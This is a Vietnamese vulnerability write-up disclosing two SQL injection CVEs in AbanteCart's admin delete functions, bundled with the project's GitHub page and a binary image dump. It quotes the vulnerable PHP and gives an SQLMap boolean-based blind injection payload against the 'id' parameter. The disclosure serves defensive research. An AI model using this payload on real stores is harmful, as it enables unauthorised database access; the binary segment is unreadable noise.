=== Content from chiggerlor.substack.com_4daf68f7_20250115_090643.html ===

[![](https://substackcdn.com/image/fetch/w_96,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](/)
# [Trung’s Substack](/)

SubscribeSign in
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart](https://substack.com/home/post/p-150200639?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMore
# CVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart

### CVE-2024-50801, CVE-2024-50802

[![](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)](https://substack.com/%40chiggerabcd)[Trung](https://substack.com/%40chiggerabcd)Oct 30, 2024
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart](https://substack.com/home/post/p-150200639?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMoreShare
# Giới thiệu

Mình xin tự giới thiệu mình là **Trung** aka **chigger** . Mình là thành viên trong gia đình [CookieHanHoan](https://www.facebook.com/cookie.han.hoan).

Mình sẽ tiếp tục với hành trình spam nhiều CVE nhất có thể.

# Thông tin lỗ hổng

Bài viết này sẽ sử dụng phương pháp phân tích **Whitebox**, còn được gọi là **Source Code Audit** để phân tích source code và tìm ra lỗ hổng.

CVE-2024-50801:

* Điểm số: 6.0
* Mức độ nguy hiểm: MEDIUM
* Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L

CVE-2024-50802:

* Điểm số: 6.0
* Mức độ nguy hiểm: MEDIUM
* Vector: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:L/A:L

# Mục tiêu

AbanteCart là một nền tảng thương mại điện tử mã nguồn mở miễn phí để hỗ trợ bán lẻ trực tuyến. AbanteCart là một ứng dụng web sẵn sàng hoạt động cũng như là nền tảng đáng tin cậy để xây dựng các giải pháp thương mại điện tử tùy chỉnh.

Công nghệ sử dụng:

* **PHP**: Ngôn ngữ lập trình phía máy chủ dùng để phát triển ứng dụng web động.
* **MySQL**: Hệ quản trị cơ sở dữ liệu mã nguồn mở lưu trữ và quản lý dữ liệu.
* **JavaScript và jQuery**: JavaScript tạo tương tác động; jQuery đơn giản hóa thao tác với DOM.
* **HTML/CSS**: HTML cấu trúc nội dung, CSS tạo kiểu cho trang web.
* **Kiến trúc MVC**: Mẫu thiết kế tách biệt logic ứng dụng, giao diện và xử lý yêu cầu.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/c6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)

Theo trang chủ của AbanteCart có khoảng **42.000 live sites**.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F0c90b09c-8b9b-479c-a8fa-7a2a216d5f7f_1447x965.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/0c90b09c-8b9b-479c-a8fa-7a2a216d5f7f_1447x965.png)
# Nguyên nhân gốc rễ (root-cause) gây ra lỗ hổng?

Lỗ hổng Injection, đặc biệt là SQL Injection, thường xuất phát từ việc ứng dụng không kiểm soát chặt chẽ dữ liệu đầu vào của người dùng, hay còn gọi là dữ liệu không đáng tin cậy (Untrusted Data). Điều này tạo ra một môi trường thuận lợi cho các cuộc tấn công, khi mà kẻ tấn công có thể tận dụng những lỗ hổng này để truy cập hoặc thao túng dữ liệu một cách trái phép.

Trong nền tảng AbanteCart, nhiều câu truy vấn SQL được viết thủ công dưới dạng raw query, làm tăng khả năng xuất hiện các lỗ hổng bảo mật. Sự thiếu sót trong việc thực hiện kiểm tra và xác thực dữ liệu đầu vào không chỉ tiềm ẩn nguy cơ mà còn đe dọa đến tính toàn vẹn và bảo mật của hệ thống.

# Type Juggling

```
<?php
     if (!(int) $id) {
            return false;
        }
     return true;
?>
```

Mình vừa phát hiện một vấn đề thú vị trong đoạn code này. Điều đáng chú ý là khi thực hiện việc chuyển đổi từ chuỗi sang số nguyên, giá trị của `$id` sẽ được xử lý như sau: nếu `$id = "abc"`, thì `(int)$id` sẽ bằng 0. Tuy nhiên, nếu `$id = "123abc"`, thì `(int)$id` sẽ trả về 123.

Do đó, với đoạn code trên, nếu giá trị của `$id` là `"123abc"`, nó có thể vượt qua kiểm tra và trả về giá trị true, có thể tạo ra lỗ hổng bảo mật.

# CVE-2024-50801

Tại file `public_html/admin/model/catalog/collection.php`, mình nhận thấy có sự xuất hiện của hàm `delete()`, trong đó thực hiện truy vấn bằng cách sử dụng cú pháp nối chuỗi trong code PHP. Mặc dù developer đã ép kiểu biến `$id` thành kiểu số nguyên, nhưng như mình đã đề cập về vấn đề type juggling ở trên, điều này vẫn có thể tạo ra lỗ hổng SQL Injection.

```
class ModelCatalogCollection extends Model
{
...
   public function delete($id)
    {
        if (!(int) $id) {
            return false;
        }
        $db = Registry::getInstance()->get('db');
        $colTableName = $db->table('collections');
        $query = 'DELETE FROM '.$colTableName.' WHERE id='.$id;
        $db->query($query);
        return true;
    }
...

```

Tại file `public_html/admin/controller/responses/listing_grid/collections.php`, mình nhận thấy sự xuất hiện của hàm `update()`, trong đó gọi hàm `delete()` được đề cập ở trên. Tuy nhiên, tham số `$id` được truyền vào hàm này lại chưa trải qua bước xác thực từ người dùng. Do đó, hàm `update()` tiềm ẩn lỗ hổng SQL Injection, cho phép kẻ tấn công có khả năng khai thác dữ liệu trái phép.

```
class ControllerResponsesListingGridCollections extends AController
{
...
   public function update()
    {
        //init controller data
        $this->extensions->hk_InitData($this, __FUNCTION__);

        $this->loadModel('catalog/collection');

        if ($this->request->is_POST()) {
            $post = $this->request->post;
            if ($post['oper'] === 'save') {
                if (!is_array($post['status'])) {
                    return;
                }
                foreach ((array) $post['status'] as $key => $value) {
                    $this->model_catalog_collection->update(
                        $key,
                        [
                            'status' => (int) $value,
                        ]
                    );
                }
            }

            if ($post['oper'] === 'del' && isset($post['id'])) {
                $ids = array_unique(explode(',', $post['id']));
                foreach ($ids as $id) {
                    $this->model_catalog_collection->delete($id);
                }
            }
        }

        //update controller data
        $this->extensions->hk_UpdateData($this, __FUNCTION__);
    }
...
}
```
## Cách khai thác

Việc thiếu kiểm tra dữ liệu đầu vào khi sử dụng raw query tiềm ẩn nguy cơ **SQL Injection**. Kẻ tấn công có thể lợi dụng ký tự đặc biệt để phá vỡ cú pháp truy vấn và thực thi mã độc hại.

Mình thử với kí tự đặc biệt 1**'(**lợi dụng type juggling**)**. Quan sát thấy server trả về thông báo **Status code 400 Application Error**. Vậy ở đây ở tham số `id` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F47634bd9-48a7-4433-9f94-adfcf721a4ec_1708x482.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/47634bd9-48a7-4433-9f94-adfcf721a4ec_1708x482.png)

Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: oper=del&id=2 RLIKE (SELECT (CASE WHEN (2470=2470) THEN 2 ELSE 0x28 END))

```
# CVE-2024-50802

Tương tự như lỗ hổng CVE đã đề cập ở trên, file `public_html/admin/model/design/email_template.php` cũng gặp phải vấn đề **type juggling.** Trong file này, mình nhận thấy sự xuất hiện của hàm `delete()`, trong đó thực hiện truy vấn bằng cú pháp nối chuỗi trong code PHP. Điều này có thể dẫn đến lỗ hổng SQL Injection, tạo cơ hội cho kẻ tấn công khai thác hệ thống.

```
class ModelDesignEmailTemplate extends Model
{
...
   public function delete($id)
    {
        if (!(int) $id) {
            return false;
        }
        $etTableName = $this->db->table('email_templates');
        $query = 'DELETE FROM '.$etTableName.' WHERE id='.$id;
        $this->db->query($query);
        return true;
    }
...
}
```

Tại file `public_html/admin/controller/responses/listing_grid/email_templates.php`, mình nhận thấy sự xuất hiện của hàm `update()`, trong đó gọi hàm `delete()` được đề cập ở trên. Tuy nhiên, tham số `$id` được truyền vào hàm này lại chưa trải qua bước xác thực từ người dùng. Do đó, hàm `update()` tiềm ẩn lỗ hổng SQL Injection, cho phép kẻ tấn công có khả năng khai thác dữ liệu trái phép.

```
class ControllerResponsesListingGridEmailTemplates extends AController
{
...
   public function update()
    {
        //init controller data
        $this->extensions->hk_InitData($this, __FUNCTION__);

        /** @var ModelDesignEmailTemplate $mdl */
        $mdl = $this->loadModel('design/email_template');

        if ($this->request->is_POST()) {
            $post = $this->request->post;
            if ($post['oper'] === 'save') {
                if (!is_array($post['status'])) {
                    return;
                }
                foreach ((array) $post['status'] as $key => $value) {
                    $mdl->update($key, ['status' => (int) $value]);
                }
            }

            if ($post['oper'] === 'del' && isset($post['id'])) {
                $ids = array_unique(explode(',', $post['id']));
                foreach ($ids as $id) {
                    $mdl->delete($id);
                }
            }
        }
...
}

```
## Cách khai thác

Việc thiếu kiểm tra dữ liệu đầu vào khi sử dụng raw query tiềm ẩn nguy cơ **SQL Injection**. Kẻ tấn công có thể lợi dụng ký tự đặc biệt để phá vỡ cú pháp truy vấn và thực thi mã độc hại.

Mình thử với kí tự đặc biệt 1**' (**lợi dụng type juggling**)**. Quan sát thấy server trả về thông báo **Status code 400 Application Error**. Vậy ở đây ở tham số `id` tồn tại lỗ hổng SQL Injection.

[![](https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7a584591-d447-4690-9a57-1f46df0b1696_1347x526.png)](https://substackcdn.com/image/fetch/f_auto%2Cq_auto%3Agood%2Cfl_progressive%3Asteep/https%3A//substack-post-media.s3.amazonaws.com/public/images/7a584591-d447-4690-9a57-1f46df0b1696_1347x526.png)

Mình sử dụng công cụ như **SQLMap** (công cụ tự động hóa quá trình khai thác lỗ hổng SQL Injection). SQLMap có thể tạo ra mã khai thác tùy chỉnh dựa trên phân tích tự động của ứng dụng mục tiêu và cơ sở dữ liệu liên quan.

Mã khai thác:

```
Parameter: #1* ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: oper=del&id=2 RLIKE (SELECT (CASE WHEN (2470=2470) THEN 2 ELSE 0x28 END))

```
#### Share this post

[![](https://substackcdn.com/image/fetch/w_520,h_272,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fc6fcf7b5-df00-4d09-8a10-5c6d91a8b8da_1620x961.png)![Trung’s Substack](https://substackcdn.com/image/fetch/w_36,h_36,c_fill,f_auto,q_auto:good,fl_progressive:steep,g_auto/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F96c3aaa3-c48d-4e4d-adc0-2b4e3e4ba0c7_144x144.png)Trung’s SubstackCVE-2024-50801 && CVE-2024-50802 SQL Injection in the AbanteCart](https://substack.com/home/post/p-150200639?utm_campaign=post&utm_medium=web)Copy linkFacebookEmailNotesMoreShare
#### Discussion about this post

CommentsRestacks![](https://substackcdn.com/image/fetch/w_32,h_32,c_fill,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack.com%2Fimg%2Favatars%2Fdefault-light.png)TopLatestDiscussions

No posts

Ready for more?

Subscribe© 2025 Trung[Privacy](https://substack.com/privacy) ∙ [Terms](https://substack.com/tos) ∙ [Collection notice](https://substack.com/ccpa#personal-data-collected) [Start Writing](https://substack.com/signup?utm_source=substack&utm_medium=web&utm_content=footer)[Get the app](https://substack.com/app/app-store-redirect?utm_campaign=app-marketing&utm_content=web-footer-button)[Substack](https://substack.com) is the home for great culture
#### Share

Copy linkFacebookEmailNotesMore

This site requires JavaScript to run correctly. Please [turn on JavaScript](https://enable-javascript.com/) or unblock scripts



=== Content from github.com_59122385_20250115_090650.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fabantecart%2Fabantecart-src)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fabantecart%2Fabantecart-src)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=abantecart%2Fabantecart-src)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[abantecart](/abantecart)
/
**[abantecart-src](/abantecart/abantecart-src)**
Public

* [Notifications](/login?return_to=%2Fabantecart%2Fabantecart-src) You must be signed in to change notification settings
* [Fork
  163](/login?return_to=%2Fabantecart%2Fabantecart-src)
* [Star
   143](/login?return_to=%2Fabantecart%2Fabantecart-src)

AbanteCart is a free PHP based eCommerce solution for merchants to provide ability creating online business and sell products online quick and efficient. AbanteCart application is built and supported by experienced enthusiasts that are passionate about their work and contribution to rapidly evolving eCommerce industry. AbanteCart is more than ju…

[www.abantecart.com](http://www.abantecart.com "www.abantecart.com")

### License

[OSL-3.0 license](/abantecart/abantecart-src/blob/master/LICENSE.txt)

[143
stars](/abantecart/abantecart-src/stargazers) [163
forks](/abantecart/abantecart-src/forks) [Branches](/abantecart/abantecart-src/branches) [Tags](/abantecart/abantecart-src/tags) [Activity](/abantecart/abantecart-src/activity)
 [Star](/login?return_to=%2Fabantecart%2Fabantecart-src)

 [Notifications](/login?return_to=%2Fabantecart%2Fabantecart-src) You must be signed in to change notification settings

* [Code](/abantecart/abantecart-src)
* [Issues
  2](/abantecart/abantecart-src/issues)
* [Pull requests
  0](/abantecart/abantecart-src/pulls)
* [Actions](/abantecart/abantecart-src/actions)
* [Projects
  0](/abantecart/abantecart-src/projects)
* [Wiki](/abantecart/abantecart-src/wiki)
* [Security](/abantecart/abantecart-src/security)
* [Insights](/abantecart/abantecart-src/pulse)

Additional navigation options

* [Code](/abantecart/abantecart-src)
* [Issues](/abantecart/abantecart-src/issues)
* [Pull requests](/abantecart/abantecart-src/pulls)
* [Actions](/abantecart/abantecart-src/actions)
* [Projects](/abantecart/abantecart-src/projects)
* [Wiki](/abantecart/abantecart-src/wiki)
* [Security](/abantecart/abantecart-src/security)
* [Insights](/abantecart/abantecart-src/pulse)

# abantecart/abantecart-src

    master[Branches](/abantecart/abantecart-src/branches)[Tags](/abantecart/abantecart-src/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[7,400 Commits](/abantecart/abantecart-src/commits/master/) | | |
| [.github](/abantecart/abantecart-src/tree/master/.github ".github") | | [.github](/abantecart/abantecart-src/tree/master/.github ".github") |  |  |
| [docker](/abantecart/abantecart-src/tree/master/docker "docker") | | [docker](/abantecart/abantecart-src/tree/master/docker "docker") |  |  |
| [public\_html](/abantecart/abantecart-src/tree/master/public_html "public_html") | | [public\_html](/abantecart/abantecart-src/tree/master/public_html "public_html") |  |  |
| [tests/phpunit](/abantecart/abantecart-src/tree/master/tests/phpunit "This path skips through empty directories") | | [tests/phpunit](/abantecart/abantecart-src/tree/master/tests/phpunit "This path skips through empty directories") |  |  |
| [.gitignore](/abantecart/abantecart-src/blob/master/.gitignore ".gitignore") | | [.gitignore](/abantecart/abantecart-src/blob/master/.gitignore ".gitignore") |  |  |
| [LICENSE.txt](/abantecart/abantecart-src/blob/master/LICENSE.txt "LICENSE.txt") | | [LICENSE.txt](/abantecart/abantecart-src/blob/master/LICENSE.txt "LICENSE.txt") |  |  |
| [README.md](/abantecart/abantecart-src/blob/master/README.md "README.md") | | [README.md](/abantecart/abantecart-src/blob/master/README.md "README.md") |  |  |
| [install.txt](/abantecart/abantecart-src/blob/master/install.txt "install.txt") | | [install.txt](/abantecart/abantecart-src/blob/master/install.txt "install.txt") |  |  |
| [release\_notes.txt](/abantecart/abantecart-src/blob/master/release_notes.txt "release_notes.txt") | | [release\_notes.txt](/abantecart/abantecart-src/blob/master/release_notes.txt "release_notes.txt") |  |  |
| View all files | | |

## Repository files navigation

* README
* OSL-3.0 license
# AbanteCart eCommerce Platform [Build Status](https://travis-ci.org/abantecart/abantecart-src)

## Overview

AbanteCart is a free open source ecommerce platform to power online retail. AbanteCart is a ready to run web application as well as reliable foundation to build custom eCommerce solutions.
AbanteCart ecommerce platform is designed to fit a wide variety of online businesses and applications, as well as can be configured or customized to perform very specific business requirements. Chosen by many shop owners launching their business online for the first time, AbanteCart is also picked by developers looking for a user-friendly interface and powerful features set.

## Reporting issues

Read the instructions below before you report an issue or a bug.

1. Search the [AbanteCart forum](http://forum.abantecart.com), ask the community if they know about the issue or can suggest how to resolve it.
2. Check open and closed issues on the [GitHub bug tracker](https://github.com/abantecart/abantecart-src/issues).
3. READ the [changelog for the master branch](https://github.com/abantecart/abantecart-src/blob/master/release_notes.txt)
4. Try [Google](http://www.google.com) to search for your issue.
5. As many issues occur due to hosting environment related settings and problems, please make sure that your issue is not related only to your hosting set up.

If issue you report is not yet reported and related to the AbanteCart core code, please report it on GitHub. Provide as much details as needed and include screenshots.

**Important!**

* Issues that are not related to the core code (such as a third party extension or your server configuration) might be closed without explanation. You need to contact extension developer, use the forum or find a third partner to resolve a custom code issue.
* If you need to report a security bug, please PM an AbanteCart moderator/administrator on the forum first. All security reports are taken seriously but you must include detailed steps to reproduce them. Please do not report theoretical security flaws and donot post security flaws in a public location.

## Making a suggestion

We like improvements, but improvements are not bugs or issue. Please do not create an issue report if you think something needs improving (such as features or change to code standards etc).
We welcome public suggestions on our [AbanteCart forum](http://forum.abantecart.com).

## How to contribute

Fork the repository, edit and submit a pull request to branch that has latest version in development.

Please be very clear on your commit messages and pull request, empty pull request messages are not accepted.

Your code standards should match the AbanteCart coding standards.

## Versioning

The version is broken down into 4 parts e.g 1.2.3.1 (MAJOR.MINOR.BULD.REVISION) to describe the version numbers.

A MAJOR is very rare, it would only be considered if the source was effectively re-written or a clean break was desired for other reasons. This increment would likely effect and break third party extensions

A MINOR is when there are significant changes that affect core structures. This increment would likely effect some third party extensions.

A BULD version is when new features are added. Updating a feature version is at a low risk of effecting third party extensions.

A REVISION version is when a fix is added, it should be considered safe to update revision versions e.g 1.2.3.1 to 1.2.3.2

## Releases

AbanteCart will announce to developers 1-2 week prior to public release of BULD versions, this is to allow for testing of their own extensions for compatibility. For bigger releases an extended period will be considered following an announced release candidate. Revision versions may have a significantly reduced developer release period.
Prerelease will be also announced on a forum.

To receive developer notifications about release information, sign up to the newsletter on the [AbanteCart website](http://www.AbanteCart.com) - located in the footer.

## How to install

Please read the installation options and instructions on [AbanteCart website](http://www.abantecart.com/ecommerce-getting-started).

## License

[Open Software License (OSL 3.0)](https://github.com/abantecart/abantecart-src/blob/master/LICENSE.txt)

## Links

* [AbanteCart homepage](http://www.abantecart.com/)
* [AbanteCart forums](http://forum.abantecart.com/)
* [AbanteCart Marketplace](http://marketplace.abantecart.com/)
* [How to documents](http://docs.abantecart.com/)

## About

AbanteCart is a free PHP based eCommerce solution for merchants to provide ability creating online business and sell products online quick and efficient. AbanteCart application is built and supported by experienced enthusiasts that are passionate about their work and contribution to rapidly evolving eCommerce industry. AbanteCart is more than ju…

[www.abantecart.com](http://www.abantecart.com "www.abantecart.com")

### Resources

[Readme](#readme-ov-file)
### License

[OSL-3.0 license](#OSL-3.0-1-ov-file)

[Activity](/abantecart/abantecart-src/activity)
### Stars

[**143**
stars](/abantecart/abantecart-src/stargazers)
### Watchers

[**36**
watching](/abantecart/abantecart-src/watchers)
### Forks

[**163**
forks](/abantecart/abantecart-src/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fabantecart%2Fabantecart-src&report=abantecart+%28user%29)

## [Releases 16](/abantecart/abantecart-src/releases)

[AbanteCart version 1.4.0
Latest

Aug 11, 2024](/abantecart/abantecart-src/releases/tag/1.4.0)
[+ 15 releases](/abantecart/abantecart-src/releases)

## Sponsor this project

* <https://www.abantecart.com/contribution>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/users/abantecart/packages?repo_name=abantecart-src)

No packages published

## [Contributors 14](/abantecart/abantecart-src/graphs/contributors)

## Languages

* [PHP
  73.3%](/abantecart/abantecart-src/search?l=php)
* [JavaScript
  17.7%](/abantecart/abantecart-src/search?l=javascript)
* [Smarty
  6.3%](/abantecart/abantecart-src/search?l=smarty)
* [CSS
  2.6%](/abantecart/abantecart-src/search?l=css)
* [Shell
  0.1%](/abantecart/abantecart-src/search?l=shell)
* [HTML
  0.0%](/abantecart/abantecart-src/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from substackcdn.com_139a7c04_20250115_133736.html ===
�PNG

   
IHDR   $   $   nb�    pHYs     ��   �eXIfII\*                V       ^   (              i�    f       H      H        �    0210�      �    0100�    ��  �    $   �    $       [Y1�  �IDATx��Wy�]U��w�����͛y3oڙV;ZA�b��ڰ�
#Fb��X#�cbI0�E�����a����Ŷ�B[
N���/o�7o�-w9�3��(ⴿ�?�=���w�z�ds�D ��s�T\*�&�}\_$�,'��o���������X�P��q�1'O��$0�.6� ��0�4��J���P]:v��?��{���ъ5��\*�@�$�3���tu{�\_j?בL%u+JR�V����/`K��B�xvx�4䷷���?R�
]����x~����iFu�s3�S)(���u��O�Gl�C�J�m�K����C�w�yˏ~�k��~����Ԅm[��ZS�����X��P�l.nxR0'�r���-3��s;:μ`XQ!�C�:�$`L������l�����>~�u���LmM��5k3�Ｑ�B�����ܐ�� �E�0`�U׮�[�^�-!0�>3[�^�2ԣ4���1Dvhd�ݷ���\_��m��o�p�?�k?�2��aȬH�6"r\��))���aF��|��|C�/�o��{x���u�3^W'�0�����w~�����-�PoF�������s/3Q�ƎV!7��6�R,,��1@M�u[ŋA�䑼g\_�Sk���>�� <��1�8��z���w>w��[���ظ���὿y���~ÊƜ4�4�HV��"@��]ņXS,����(�BF\_���=��q��FGo����|��ž����/������+9U�����BI̙~?�IĘ��kҵ�ȏ^���6�k�1��9O�����gc�đ�;��<�H�qn
�/��������4,��jJ��i�l������I���=GZ��Je����C�|�قЎ&�� ]�w�+������ܻ#��c�\*��T�z
��\�4��8c���6l�.��ě�^9���x5G��T)�eC��m�������ҭ�}�w^��v�wu3\*��Kf $"]��t��jǶa��{=�w���X��B�e{o\*w��-P�o�Z�q�x��}��E���ҙ\*@!�h83�C�t�q����'���9^0P
��p@,�Ě�Lv��s�s�rȢ�9����V'��#������� Ƹ��@�@5�� �Œ�8\5�/��"��P)�@ �<��� �u#5�Bҥ��@��x�
��f&@M��ܔm�5�Z�+W��Re1fx���L�p��|\\_�� ��r}�=o^[,��ƥ˒�\_�anM+�����Q�>r����7��V�dy�H�2��Bi�c��t
fض��f���GЩ�:y�eY+�
�YՂ���c0����mXy�&5�tM�-�a.���5��N�~l띟-�]��"��� ӄ�R�l�!`�jk���� �Qՙ�#�K�L����+��.T���p&D����Mr�f[L�����杯�X�9��>e����!�S��k�\E���ĘD���RY���'2�p�o��:���S\������ � l��|�\*�?
���9�ʯ��WD!
D��Cf��fʩ��[o������[��$
Ao�����F1�"�b&��!ʨ���q�%����h��#A5!f��I
�"�IbBjA@�\�M���j��UZ��쪣����|{��)��F�]��Aנg�������% 4I����6������@q� ���hD��P���HG�M����V?z $���r0���^2D({j��\_�.p �.e"�9c�����A�� i���^�m�����3r��Z�]�`,�֒4Sd �s���c\_�{H��!H�ª��\_�.��J��TK��K\_� S'j�gR�zq:��>�J�r@eN�4�2,��\�Ch�X%�D 7w��qM�����+P�>�pԉ8�`�,\_���龭H��ØJ@.�L՚��Z>x�U�3�����Lsdw����(�u#WZ�n��.^ !�j��4
�/f�T��8-�� }N��/�iu    IEND�B`�

=== Content from substack.com_46280fbd_20250115_221105.html ===

